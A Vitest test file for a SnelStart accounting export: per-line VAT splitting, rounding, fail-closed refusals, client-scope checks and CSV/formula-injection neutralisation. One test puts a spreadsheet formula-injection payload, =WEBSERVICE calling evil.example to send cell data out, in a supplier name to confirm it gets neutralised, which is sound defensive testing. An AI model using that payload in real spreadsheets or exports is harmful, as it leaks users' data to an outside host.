import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  assertSnelstartExportScope,
  buildBankSnelstartRows,
  buildPurchaseInvoiceExport,
  exportAllForClient,
  exportBankTransactionsCSV,
  exportPurchaseInvoicesCSV,
  exportSalesInvoicesCSV,
  neutralizeCsvText,
  requireSnelstartBankDagboek,
  SnelstartExportError,
  type SnelstartLedgerAccount,
  type SnelstartPurchaseLine,
} from "@/lib/snelstart-export";
import { csvLines, downloads, installDownloadCapture } from "./support/snelstart-export-fakes";

/**
 * Herstelpakket P6 — de pure kern van de SnelStart-export.
 *
 * A2-04: inkoop per boekingsregel. "Bedrag" is incl. btw met het teken zoals
 * opgeslagen; per regel excl + round(excl × tarief / 100); Σ regels = kop incl.
 * B2-14: tekstvelden geneutraliseerd, bedrag-/datum-/codevelden exact gelijk.
 * A2-05: de exportfuncties zelf weigeren gemengde of vreemde administraties.
 * C-11: geen 1100-fallback voor het bankdagboek.
 */

const ORG = "org-1";
const inv = (id: string, over: Record<string, any> = {}): any => ({
  id,
  client_id: "c1",
  organization_id: ORG,
  supplier: "Leverancier BV",
  invoice_number: "000123",
  invoice_date: "2026-10-20",
  amount_excl: 200,
  btw_amount: 30,
  amount_incl: 230,
  btw_percentage: 21,
  status: "gecontroleerd",
  remaining_amount: 230,
  ledger_account_text: "4400 - Kantoorkosten",
  ...over,
});
const line = (id: string, invoiceId: string, over: Partial<SnelstartPurchaseLine> = {}): SnelstartPurchaseLine => ({
  id,
  purchase_invoice_id: invoiceId,
  omschrijving: `Regel ${id}`,
  amount_excl: 100,
  btw_percentage: 21,
  grootboekrekening_id: "gb-4400",
  sort_order: 0,
  organization_id: ORG,
  ...over,
});
const acct = (id: string, nummer: number, over: Partial<SnelstartLedgerAccount> = {}): SnelstartLedgerAccount => ({
  id, nummer, organization_id: ORG, client_id: null, ...over,
});
const ACCOUNTS = [acct("gb-4400", 4400), acct("gb-4600", 4600), acct("gb-7000", 7000)];
const A204_LINES = [
  line("l-1", "p-1", { omschrijving: "Kantoorartikelen", amount_excl: 100, btw_percentage: 21, grootboekrekening_id: "gb-4400", sort_order: 0 }),
  line("l-2", "p-1", { omschrijving: "Vakliteratuur", amount_excl: 100, btw_percentage: 9, grootboekrekening_id: "gb-4600", sort_order: 1 }),
];
const build = (invoices: any[], lines: SnelstartPurchaseLine[], accounts = ACCOUNTS, forMarking = false) =>
  buildPurchaseInvoiceExport({ invoices, lines, accounts, forMarking });
const reasonOf = (plan: ReturnType<typeof build>, id: string) => plan.refused.find((r) => r.invoiceId === id)?.reason ?? "";

beforeEach(() => installDownloadCapture());
afterEach(() => vi.restoreAllMocks());

describe("A2-04 — inkoop per boekingsregel", () => {
  it("de UBL-factuur 100 @ 21% (4400) + 100 @ 9% (4600) wordt twee regels met de juiste nummers en codes", () => {
    const plan = build([inv("p-1")], A204_LINES);
    expect(plan.rows).toEqual([
      '"20-10-2026";"Leverancier BV - 000123 - Kantoorartikelen";"4400";"121,00";"1"',
      '"20-10-2026";"Leverancier BV - 000123 - Vakliteratuur";"4600";"109,00";"2"',
    ]);
    expect(plan.exportedInvoiceIds).toEqual(["p-1"]);
    expect(plan.refused).toEqual([]);
  });

  it("Bedrag houdt de betekenis 'incl. btw': Σ regels = het kopbedrag incl., tot op de cent", () => {
    const plan = build([inv("p-1")], A204_LINES);
    const sum = plan.rows.map((r) => Number(r.split(";")[3].replace(/"/g, "").replace(",", "."))).reduce((a, b) => a + b, 0);
    expect(Math.round(sum * 100)).toBe(23000);
  });

  it("het kop-btw% doet er niet meer toe; de code komt per regel uit het regeltarief", () => {
    const plan = build([inv("p-1", { btw_percentage: null })], A204_LINES);
    expect(plan.rows.map((r) => r.split(";")[4])).toEqual(['"1"', '"2"']);
  });

  it("0% blijft code '0', met het bedrag excl. = incl.", () => {
    const plan = build(
      [inv("p-0", { amount_excl: 50, btw_amount: 0, amount_incl: 50, btw_percentage: 0 })],
      [line("l-0", "p-0", { amount_excl: 50, btw_percentage: 0, grootboekrekening_id: "gb-7000", omschrijving: "Premie" })],
    );
    expect(plan.rows).toEqual(['"20-10-2026";"Leverancier BV - 000123 - Premie";"7000";"50,00";"0"']);
  });

  it("volgt de volgorde van post_purchase_invoice: sort_order, dan id", () => {
    const lines = [
      line("l-b", "p-1", { sort_order: 1, omschrijving: "B" }),
      line("l-c", "p-1", { sort_order: 0, omschrijving: "C" }),
      line("l-a", "p-1", { sort_order: 1, omschrijving: "A" }),
    ];
    const plan = build([inv("p-1", { amount_excl: 300, btw_amount: 63, amount_incl: 363 })], lines);
    expect(plan.rows.map((r) => r.split(";")[1])).toEqual([
      '"Leverancier BV - 000123 - C"', '"Leverancier BV - 000123 - A"', '"Leverancier BV - 000123 - B"',
    ]);
  });

  it("een regel zonder omschrijving krijgt de factuuromschrijving", () => {
    const plan = build([inv("p-1", { amount_excl: 100, btw_amount: 21, amount_incl: 121 })], [line("l-1", "p-1", { omschrijving: "  " })]);
    expect(plan.rows[0].split(";")[1]).toBe('"Leverancier BV - 000123"');
  });

  it("btw per regel half van nul af in centen: 0,50 @ 21% = 0,11; 0,10 @ 9% = 0,01", () => {
    const plan = build(
      [inv("p-1", { amount_excl: 0.6, btw_amount: 0.12, amount_incl: 0.72 })],
      [line("l-1", "p-1", { amount_excl: 0.5, btw_percentage: 21 }), line("l-2", "p-1", { amount_excl: 0.1, btw_percentage: 9, grootboekrekening_id: "gb-4600", sort_order: 1 })],
    );
    expect(plan.rows.map((r) => r.split(";")[3])).toEqual(['"0,61"', '"0,11"']);
  });

  it("een creditnota (negatieve bedragen) houdt het teken; de btw is symmetrisch afgerond", () => {
    const plan = build(
      [inv("p-cn", { amount_excl: -100.5, btw_amount: -21.11, amount_incl: -121.61 })],
      [line("l-cn", "p-cn", { amount_excl: -100.5, btw_percentage: 21 })],
    );
    expect(plan.rows).toEqual(['"20-10-2026";"Leverancier BV - 000123 - Regel l-cn";"4400";"-121,61";"1"']);
  });

  describe("fail-closed: niet geëxporteerd, met reden", () => {
    const cases: Array<[string, any, SnelstartPurchaseLine[], RegExp, SnelstartLedgerAccount[]?]> = [
      ["zonder regels", inv("p"), [], /geen boekingsregels/],
      ["een regel zonder grootboekrekening", inv("p", { amount_excl: 100, btw_amount: 21, amount_incl: 121 }), [line("l", "p", { grootboekrekening_id: null })], /1 boekingsregel zonder grootboekrekening/],
      ["een regel met onbekende btw (NULL)", inv("p", { amount_excl: 100, btw_amount: 21, amount_incl: 121 }), [line("l", "p", { btw_percentage: null })], /zonder btw-percentage \(onbekende btw\)/],
      ["een tarief zonder SnelStart-code (6%)", inv("p", { amount_excl: 100, btw_amount: 6, amount_incl: 106 }), [line("l", "p", { btw_percentage: 6 })], /btw-percentage 6% heeft geen SnelStart-btw-code/],
      ["een rekening van een andere administratie", inv("p", { amount_excl: 100, btw_amount: 21, amount_incl: 121 }), [line("l", "p", { grootboekrekening_id: "gb-c2" })], /niet bij deze administratie hoort/, [...ACCOUNTS, acct("gb-c2", 4500, { client_id: "c2" })]],
      ["een rekening van een andere organisatie", inv("p", { amount_excl: 100, btw_amount: 21, amount_incl: 121 }), [line("l", "p", { grootboekrekening_id: "gb-org2" })], /niet gevonden is of niet bij deze administratie hoort/, [...ACCOUNTS, acct("gb-org2", 4400, { organization_id: "org-2" })]],
      ["een onbekende rekening", inv("p", { amount_excl: 100, btw_amount: 21, amount_incl: 121 }), [line("l", "p", { grootboekrekening_id: "gb-weg" })], /niet gevonden/],
      ["een regel van een andere organisatie (A2-17)", inv("p", { amount_excl: 100, btw_amount: 21, amount_incl: 121 }), [line("l", "p", { organization_id: "org-2" })], /andere organisatie/],
      ["een regelbedrag met subcenten (A3-16)", inv("p", { amount_excl: 100, btw_amount: 21, amount_incl: 121 }), [line("l", "p", { amount_excl: 100.005 })], /geen geldig bedrag in hele centen/],
      ["regels die excl. niet op de kop sluiten", inv("p"), [line("l", "p", { amount_excl: 100, btw_percentage: 21 })], /sluiten niet aan op de factuur \(excl\. btw €200,00\)/],
      ["een kop die zelf niet sluit", inv("p", { amount_excl: 100, btw_amount: 20, amount_incl: 121 }), [line("l", "p")], /de factuur sluit niet/],
      ["kop-btw buiten de werkbanktolerantie (H6-01)", inv("p", { amount_excl: 100, btw_amount: 21.05, amount_incl: 121.05 }), [line("a", "p", { amount_excl: 100, btw_percentage: 21 })], /btw per boekingsregel \(€21,00\) wijkt af van de btw op de factuur \(€21,05\)/],
      ["een kop zonder bedrag incl.", inv("p", { amount_incl: null }), [line("l", "p")], /mist een geldig bedrag/],
      ["een factuur zonder datum", inv("p", { invoice_date: null }), [line("l", "p")], /geen factuurdatum/],
    ];
    it.each(cases)("%s", (_naam, invoice, lines, reason, accounts) => {
      const plan = build([invoice], lines, accounts ?? ACCOUNTS);
      expect(plan.rows).toEqual([]);
      expect(plan.exportedInvoiceIds).toEqual([]);
      expect(reasonOf(plan, "p")).toMatch(reason);
      expect(plan.refused[0].label).toBe("Leverancier BV - 000123");
    });

    it("meerdere regelproblemen staan samen in één reden", () => {
      const plan = build([inv("p")], [line("a", "p", { grootboekrekening_id: null }), line("b", "p", { btw_percentage: null, sort_order: 1 })]);
      expect(reasonOf(plan, "p")).toMatch(/1 boekingsregel zonder grootboekrekening; 1 boekingsregel zonder btw-percentage/);
    });

    it("een geweigerde factuur haalt de rest niet onderuit", () => {
      const plan = build([inv("p-1"), inv("p-leeg")], A204_LINES);
      expect(plan.exportedInvoiceIds).toEqual(["p-1"]);
      expect(plan.refused.map((r) => r.invoiceId)).toEqual(["p-leeg"]);
    });
  });

  describe("D1 — markeren mag de betaalstatus niet veranderen", () => {
    it("'betaald' met restant ≠ 0 of onbekend wordt geweigerd als er gemarkeerd wordt", () => {
      for (const remaining of [230, null, 0.01]) {
        const plan = build([inv("p-1", { status: "betaald", remaining_amount: remaining })], A204_LINES, ACCOUNTS, true);
        expect(reasonOf(plan, "p-1")).toMatch(/betaalstatus/);
      }
    });

    it("'betaald' met restant 0 gaat mee; zonder markering (ZIP) geldt de toets niet", () => {
      expect(build([inv("p-1", { status: "betaald", remaining_amount: 0 })], A204_LINES, ACCOUNTS, true).exportedInvoiceIds).toEqual(["p-1"]);
      expect(build([inv("p-1", { status: "betaald", remaining_amount: 230 })], A204_LINES, ACCOUNTS, false).exportedInvoiceIds).toEqual(["p-1"]);
    });
  });
});

describe("H6-01 — kop-btw over het totaal afgerond (zoals de werkbank): verdeeld per tarief, grootste rest, teruggerekend getoetst", () => {
  const parse = (r: string) => r.split(";").map((f) => f.replace(/^"|"$/g, ""));
  const incl = (r: string) => Math.round(Number(parse(r)[3].replace(",", ".")) * 100);
  const pct = (r: string) => ({ "1": 21, "2": 9, "0": 0 })[parse(r)[4]] as number;
  // SnelStart rekent de btw terug uit incl + code (aanname uit het grootboekharnas).
  const derived = (r: string) => {
    const p = pct(r), i = incl(r);
    return p === 0 ? 0 : Math.sign(i) * Math.round((Math.abs(i) * p) / (100 + p));
  };

  it("H6-01b: 2 × 1,30 @ 21% met kop 0,55 is niet terug te rekenen (1,58 → 0,27) — geweigerd met reden", () => {
    const plan = build(
      [inv("p", { amount_excl: 2.6, btw_amount: 0.55, amount_incl: 3.15 })],
      [line("b", "p", { amount_excl: 1.3, sort_order: 1 }), line("a", "p", { amount_excl: 1.3, sort_order: 0 })],
    );
    expect(plan.rows).toEqual([]);
    expect(reasonOf(plan, "p")).toMatch(/SnelStart uit elk bedrag incl\. btw dezelfde btw terugrekent/);
  });

  it("kiest een alternatieve toewijzing die wél terugrekent: 2 × 1,30 @ 21% + 3 × 1,50 @ 9%, kop 0,95", () => {
    // Grootste rest zou 21% → 0,55 geven (niet terug te rekenen); het alternatief 21% → 0,54, 9% → 0,41 sluit wel.
    const plan = build(
      [inv("p", { amount_excl: 7.1, btw_amount: 0.95, amount_incl: 8.05 })],
      [
        line("a", "p", { amount_excl: 1.3, sort_order: 0 }),
        line("b", "p", { amount_excl: 1.3, sort_order: 1 }),
        line("c", "p", { amount_excl: 1.5, btw_percentage: 9, grootboekrekening_id: "gb-4600", sort_order: 2 }),
        line("d", "p", { amount_excl: 1.5, btw_percentage: 9, grootboekrekening_id: "gb-4600", sort_order: 3 }),
        line("e", "p", { amount_excl: 1.5, btw_percentage: 9, grootboekrekening_id: "gb-4600", sort_order: 4 }),
      ],
    );
    expect(plan.refused).toEqual([]);
    expect(plan.rows.map((r) => parse(r)[3])).toEqual(["1,57", "1,57", "1,64", "1,64", "1,63"]);
    expect(plan.rows.reduce((s, r) => s + derived(r), 0)).toBe(95);
  });

  it("H6-01c: grens van de tolerantie — 2,50 @ 21% + 1,50 @ 9%: kop 0,65 (verschil 2) geëxporteerd, kop 0,64 geweigerd", () => {
    const lines = [
      line("a", "p", { amount_excl: 2.5, sort_order: 0 }),
      line("b", "p", { amount_excl: 1.5, btw_percentage: 9, grootboekrekening_id: "gb-4600", sort_order: 1 }),
    ];
    const ok = build([inv("p", { amount_excl: 4, btw_amount: 0.65, amount_incl: 4.65 })], lines);
    expect(ok.rows.map((r) => parse(r)[3])).toEqual(["3,02", "1,63"]);
    const nee = build([inv("p", { amount_excl: 4, btw_amount: 0.64, amount_incl: 4.64 })], lines);
    expect(nee.rows).toEqual([]);
    expect(reasonOf(nee, "p")).toMatch(/btw per boekingsregel \(€0,67\) wijkt af van de btw op de factuur \(€0,64\)/);
  });

  it("H6-01d: gelijke rest tussen tarieven — het lagere tarief krijgt de extra cent eerst", () => {
    // 21%: 2,50 → 0,525; 9%: 1,50 → 0,135; beide rest 50. Kop 0,66 = 0,65 + 1 cent → naar 9%.
    const plan = build(
      [inv("p", { amount_excl: 4, btw_amount: 0.66, amount_incl: 4.66 })],
      [
        line("a", "p", { amount_excl: 2.5, sort_order: 0 }),
        line("b", "p", { amount_excl: 1.5, btw_percentage: 9, grootboekrekening_id: "gb-4600", sort_order: 1 }),
      ],
    );
    expect(plan.rows.map((r) => parse(r)[3])).toEqual(["3,02", "1,64"]);
  });

  it("property: elke geëxporteerde factuur sluit exact op de kop én teruggerekend per rij; elke regel < 1 cent van exact", () => {
    let seed = 20261021;
    const rnd = () => ((seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648);
    let exported = 0;
    for (let t = 0; t < 3000; t++) {
      const n = 1 + Math.floor(rnd() * 6);
      const sign = rnd() < 0.2 ? -1 : 1;
      const lines = Array.from({ length: n }, (_, i) =>
        line(`l${i}`, "p", { amount_excl: (sign * Math.floor(rnd() * 50000 + 1)) / 100, btw_percentage: [21, 9, 0][Math.floor(rnd() * 3)], sort_order: i }),
      );
      const exclC = lines.map((l) => Math.round(l.amount_excl * 100));
      const exact = lines.map((l, i) => (exclC[i] * (l.btw_percentage as number)) / 100);
      const sumExcl = exclC.reduce((a, b) => a + b, 0);
      // zoals computeLineTotals + deriveHeaderFromLines: btw over het totaal afgerond
      const tot = exact.reduce((a, b) => a + b, 0);
      const vat = Math.sign(tot) * Math.round(Math.abs(tot));
      const plan = build([inv("p", { amount_excl: sumExcl / 100, btw_amount: vat / 100, amount_incl: (sumExcl + vat) / 100 })], lines);
      if (!plan.rows.length) {
        expect(reasonOf(plan, "p")).toMatch(/terugrekent/);
        continue;
      }
      exported++;
      expect(plan.rows.reduce((s, r) => s + incl(r), 0)).toBe(sumExcl + vat);
      expect(plan.rows.reduce((s, r) => s + derived(r), 0)).toBe(vat);
      plan.rows.forEach((r, i) => {
        expect(derived(r)).toBe(incl(r) - exclC[i]);
        expect(Math.abs(incl(r) - exclC[i] - exact[i])).toBeLessThan(1);
      });
    }
    expect(exported).toBeGreaterThan(2000);
  });
});

describe("A2-05 — de exportfuncties zelf weigeren gemengde of vreemde administraties", () => {
  it("assertSnelstartExportScope", () => {
    const een = { client_id: "c1", organization_id: ORG };
    expect(() => assertSnelstartExportScope([een], { clientId: "c1", organizationId: ORG }, "facturen")).not.toThrow();
    expect(() => assertSnelstartExportScope([], { clientId: "c1" }, "facturen")).not.toThrow();
    expect(() => assertSnelstartExportScope([een], { clientId: "all" }, "facturen")).toThrow(/geen administratie gekozen/);
    expect(() => assertSnelstartExportScope([een], { clientId: "" }, "facturen")).toThrow(SnelstartExportError);
    expect(() => assertSnelstartExportScope([een, { client_id: "c2", organization_id: ORG }], { clientId: "c1" }, "facturen")).toThrow(/2 administraties/);
    expect(() => assertSnelstartExportScope([{ client_id: "c2", organization_id: ORG }], { clientId: "c1" }, "facturen")).toThrow(/niet bij de gekozen administratie/);
    expect(() => assertSnelstartExportScope([{ client_id: "c1", organization_id: "org-2" }], { clientId: "c1", organizationId: ORG }, "facturen")).toThrow(/actieve organisatie/);
  });

  it("exportPurchaseInvoicesCSV: geen bestand bij rijen van twee administraties", () => {
    expect(() =>
      exportPurchaseInvoicesCSV({ invoices: [inv("p-1"), inv("p-9", { client_id: "c2" })], lines: A204_LINES, accounts: ACCOUNTS, clientId: "c1" }),
    ).toThrow(/2 administraties/);
    expect(downloads).toHaveLength(0);
  });

  it("exportPurchaseInvoicesCSV: geen bestand bij 'Alle klanten'", () => {
    expect(() => exportPurchaseInvoicesCSV({ invoices: [inv("p-1")], lines: A204_LINES, accounts: ACCOUNTS, clientId: "all" })).toThrow(/geen administratie gekozen/);
    expect(downloads).toHaveLength(0);
  });

  it("exportPurchaseInvoicesCSV: download alleen als er iets te exporteren is; geeft precies de geëxporteerde id's", async () => {
    const leeg = exportPurchaseInvoicesCSV({ invoices: [inv("p-leeg")], lines: [], accounts: ACCOUNTS, clientId: "c1" });
    expect(leeg).toMatchObject({ exportedInvoiceIds: [], filename: null });
    expect(downloads).toHaveLength(0);
    const res = exportPurchaseInvoicesCSV({ invoices: [inv("p-1"), inv("p-leeg")], lines: A204_LINES, accounts: ACCOUNTS, clientId: "c1", clientName: "Bakkerij Een BV", year: 2026 });
    expect(res.exportedInvoiceIds).toEqual(["p-1"]);
    expect(res.refused.map((r) => r.invoiceId)).toEqual(["p-leeg"]);
    expect(downloads.map((d) => d.name)).toEqual(["Bakkerij_Een_BV_inkoopfacturen_snelstart_2026.csv"]);
  });

  it("exportSalesInvoicesCSV: geen bestand bij rijen van een andere administratie", () => {
    const s = (id: string, client_id: string): any => ({ id, client_id, organization_id: ORG, customer_name: "K", invoice_number: id, invoice_date: "2026-10-01", amount_incl: 121, btw_percentage: 21, ledger_account_text: "8000" });
    expect(() => exportSalesInvoicesCSV([s("s-1", "c1"), s("s-2", "c2")], { clientId: "c1" })).toThrow(/2 administraties/);
    expect(() => exportSalesInvoicesCSV([s("s-2", "c2")], { clientId: "c1" })).toThrow(/niet bij de gekozen administratie/);
    expect(downloads).toHaveLength(0);
    exportSalesInvoicesCSV([s("s-1", "c1")], { clientId: "c1", clientName: "Bakkerij Een BV" });
    expect(downloads.map((d) => d.name)).toEqual(["Bakkerij_Een_BV_verkoopfacturen_snelstart.csv"]);
  });

  it("exportAllForClient: geen ZIP bij facturen, boekingen of bankregels van een andere administratie", async () => {
    const base = {
      clientId: "c1", organizationId: ORG, clientName: "Bakkerij Een BV",
      invoices: [inv("p-1")], lines: A204_LINES, accounts: ACCOUNTS,
      entries: [] as any[], transactions: [] as any[], grootboekrekeningen: [], bankDagboek: 1200,
    };
    await expect(exportAllForClient({ ...base, invoices: [inv("p-9", { client_id: "c2" })] })).rejects.toThrow(/inkoopfacturen horen niet/);
    const vreemd = { client_id: "c2", organization_id: ORG } as any;
    await expect(exportAllForClient({ ...base, entries: [vreemd] })).rejects.toThrow(/boekingen horen niet/);
    await expect(exportAllForClient({ ...base, transactions: [vreemd] })).rejects.toThrow(/banktransacties horen niet/);
    expect(downloads).toHaveLength(0);
  });
});

describe("C-11 — bankdagboek verplicht, geen 1100-fallback", () => {
  const tx = (over: Record<string, any> = {}): any => ({
    id: "t-1", client_id: "c1", organization_id: ORG, transaction_date: "2026-10-05", description: "Betaling",
    amount: -121, match_status: "handmatig_geboekt", grootboekrekening_id: "gb-4400", ...over,
  });
  const gb = [{ id: "gb-4400", nummer: 4400, omschrijving: "Kosten" }];

  it("requireSnelstartBankDagboek weigert alles behalve een positief geheel getal", () => {
    for (const bad of [null, undefined, 0, -1, 1.5, Number.NaN]) {
      expect(() => requireSnelstartBankDagboek(bad as any)).toThrow(/Geen SnelStart-bankdagboek ingesteld/);
    }
    expect(requireSnelstartBankDagboek(1200)).toBe(1200);
  });

  it("buildBankSnelstartRows en exportBankTransactionsCSV vallen niet terug op 1100", () => {
    expect(() => buildBankSnelstartRows([tx()], gb, null as any)).toThrow(/bankdagboek/);
    expect(() => exportBankTransactionsCSV([tx()], gb, "Klant", null)).toThrow(/bankdagboek/);
    expect(() => exportBankTransactionsCSV([tx()], gb, "Klant", undefined)).toThrow(/bankdagboek/);
    expect(downloads).toHaveLength(0);
  });

  it("exportBankTransactionsCSV weigert rijen van twee administraties", () => {
    expect(() => exportBankTransactionsCSV([tx(), tx({ id: "t-2", client_id: "c2" })], gb, "Klant", 1200)).toThrow(/2 administraties/);
    expect(downloads).toHaveLength(0);
  });

  it("met dagboek: twee rijen per transactie, regels zonder rekening stil overgeslagen, geen BOM", async () => {
    const meta = exportBankTransactionsCSV([tx(), tx({ id: "t-2", grootboekrekening_id: null })], gb, "Klant", 1200);
    expect(meta).toMatchObject({ exportedTransactions: 1, exportedCsvRows: 2, skippedTransactions: 1, skippedManualInvalidLedger: 1 });
    const { bom, lines } = await csvLines(downloads[0]);
    expect(bom).toBe(false);
    expect(lines.slice(1)).toEqual(["1200;1;05-10-2026;1200;0;121,00;Betaling", "1200;1;05-10-2026;4400;121,00;0;Betaling"]);
  });
});

describe("B2-14 — CSV- en formule-injectie", () => {
  it("neutralizeCsvText: =, +, -, @, tab en CR vooraan krijgen een apostrof; andere tekst blijft exact", () => {
    for (const s of ["=1+1", "+31 6 1234", "-Terugboeking", "@SUM(A1)", "\tTab", "\rCR"]) {
      expect(neutralizeCsvText(s)).toBe(`'${s}`);
    }
    for (const s of ["Leverancier BV", " =spatie", "1-2-3", "", "'al gequote", "Café = goed"]) {
      expect(neutralizeCsvText(s)).toBe(s);
    }
  });

  it("inkoop: de omschrijving wordt geneutraliseerd; datum, rekening, bedrag en code blijven exact", () => {
    const plan = build(
      [inv("p-cn", { supplier: '=WEBSERVICE("https://evil.example/?d="&C2)', amount_excl: -100, btw_amount: -21, amount_incl: -121 })],
      [line("l", "p-cn", { amount_excl: -100 })],
    );
    expect(plan.rows).toEqual([
      `"20-10-2026";"'=WEBSERVICE(""https://evil.example/?d=""&C2) - 000123 - Regel l";"4400";"-121,00";"1"`,
    ]);
  });

  it("bank (SnelStart 12): de omschrijving wordt geneutraliseerd; negatieve bedragen en codes blijven", () => {
    const { rows } = buildBankSnelstartRows(
      [{ id: "t", client_id: "c1", transaction_date: "2026-10-01", description: "-Storno huur", amount: -0.01, match_status: "handmatig_geboekt", grootboekrekening_id: "g1" } as any],
      [{ id: "g1", nummer: 4500, omschrijving: "Kosten" }],
      1100,
    );
    expect(rows).toEqual(["1100;1;01-10-2026;1100;0;0,01;'-Storno huur", "1100;1;01-10-2026;4500;0,01;0;'-Storno huur"]);
  });

  it("bank: na neutraliseren nog steeds hooguit 100 tekens, zonder ; of regeleinden", () => {
    const { rows } = buildBankSnelstartRows(
      [{ id: "t", client_id: "c1", transaction_date: "2026-10-01", description: `=${"x".repeat(150)};\nend`, amount: 5, match_status: "handmatig_geboekt", grootboekrekening_id: "g1" } as any],
      [{ id: "g1", nummer: 4500, omschrijving: "Kosten" }],
      1100,
    );
    const oms = rows[0].split(";").slice(6).join(";");
    expect(oms).toHaveLength(100);
    expect(oms.startsWith("'=")).toBe(true);
  });
});
